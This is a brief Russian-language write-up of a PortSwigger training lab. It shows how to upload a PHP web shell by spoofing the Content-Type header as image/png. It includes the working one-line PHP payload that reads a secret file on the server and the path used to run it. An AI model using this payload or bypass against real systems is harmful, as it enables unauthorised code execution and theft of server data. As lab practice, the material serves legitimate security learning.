# PortSwigger: веб-шелл через загрузку файла

**Лаба:** [Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

## Суть

В профиле можно менять аватар. Проверяется только заявленный тип файла в заголовке Content-Type; расширение и содержимое не проверяются.

## Решение

1. Сохранил PHP-скрипт `exploit.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. В Burp поменял `Content-Type: application/x-php` на `image/png`.
3. Открыл `/files/avatars/exploit.php` — секрет на экране, лаба закрыта.

## Заметка

Путь `/files/avatars/` определил по ответу сервера. На всякий случай проверил `/files/` через dirsearch, но дополнительных файлов не нашёл.

Эта заметка описывает обход проверки Content-Type. У лабораторной Remote code execution via web shell upload проверок загружаемого файла нет.

Другие обходы фильтров — в шпаргалке [file-upload](../../../Stuff/file-upload.md).
